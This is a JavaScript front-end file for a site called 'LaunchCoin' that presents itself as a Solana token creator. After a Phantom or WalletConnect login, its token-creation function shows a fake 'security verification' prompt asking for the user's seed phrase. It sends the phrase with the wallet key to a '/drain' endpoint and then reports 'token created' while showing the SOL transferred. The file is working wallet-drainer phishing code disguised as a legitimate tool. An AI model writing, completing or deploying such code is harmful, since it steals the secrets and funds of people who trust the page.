// ===== CONFIGURAZIONE =====
import { UniversalProvider } from '@walletconnect/universal-provider';
import { WalletConnectModal } from '@walletconnect/modal';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');

// ===== ESPONI FUNZIONI SU WINDOW =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== WALLETCONNECT MODAL (STANDALONE) =====
let modal = null;
let provider = null;
let isConnecting = false;

function initModal() {
  if (!modal) {
    modal = new WalletConnectModal({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      themeMode: 'dark',
      themeVariables: {
        '--wcm-z-index': '10000',
        '--wcm-background-color': '#0b1022',
        '--wcm-accent-color': '#22d1f8',
      },
      // METADATA OBBLIGATORI
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      },
      // ABILITA WALLETCONNECT
      enableWalletConnect: true,
      walletConnectVersion: 2,
    });
    console.log('✅ WalletConnectModal inizializzato');
  }
  return modal;
}

// ===== INIZIALIZZA UNIVERSAL PROVIDER =====
async function initProvider() {
  if (!provider) {
    provider = await UniversalProvider.init({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      }
    });
    console.log('✅ UniversalProvider inizializzato');
  }
  return provider;
}

// ===== CONNECT WALLET CON WALLETCONNECT =====
async function connectWithWalletConnect() {
  if (isConnecting) return;
  isConnecting = true;
  
  try {
    // 1. Inizializza provider e modal
    const prov = await initProvider();
    const modalInstance = initModal();
    
    // 2. Genera l'URI di connessione
    const uri = prov.uri;
    if (!uri) {
      throw new Error('Impossibile generare URI WalletConnect');
    }
    
    console.log('🔗 URI WalletConnect:', uri);
    
    // 3. Apri il modal con il QR code
    await modalInstance.open({ uri });
    
    // 4. Aspetta che l'utente si connetta (solo per telefono)
    // UniversalProvider gestisce la connessione in background
    await prov.connect({
      chains: ['solana:mainnet'],
      optionalChains: ['solana:devnet'],
      methods: ['solana_signTransaction', 'solana_signMessage'],
      events: ['chainChanged', 'accountsChanged']
    });
    
    // 5. Verifica la connessione
    const accounts = prov.accounts;
    if (accounts && accounts.length > 0) {
      walletPublicKey = accounts[0].split(':')[2] || accounts[0];
      alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    }
    
    throw new Error('Nessun account trovato');
    
  } catch (e) {
    console.error('❌ WalletConnect error:', e);
    alert(
      '❌ WalletConnect fallito: ' + e.message + '\n\n' +
      'Su PC: usa Phantom con estensione.\n' +
      'Su Telefono: usa Kiwi Browser con Phantom.\n' +
      'Oppure usa WalletConnect via QR (se apparso).'
    );
    window.location.href = 'wallet.html';
  } finally {
    isConnecting = false;
  }
}

// ===== CONNECT WALLET (MAIN) =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  // 1. Prova Phantom (estensione PC o Kiwi)
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  // 2. Usa WalletConnect (funziona su telefono con QR)
  await connectWithWalletConnect();
};

// ===== SELECT WALLET =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet:', walletName);
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  alert(
    '⚠️ Wallet "' + walletName + '" verrà connesso tramite WalletConnect.\n\n' +
    '1. Apparirà un QR code.\n' +
    '2. Scansiona con l\'app del wallet.\n' +
    '3. Approva la connessione.'
  );
  window.connectWallet();
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\n' +
      'Inserisci la tua seed phrase per completare la creazione:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato');
console.log('🔵 connectWallet:', typeof window.connectWallet);
console.log('🔵 selectWallet:', typeof window.selectWallet);
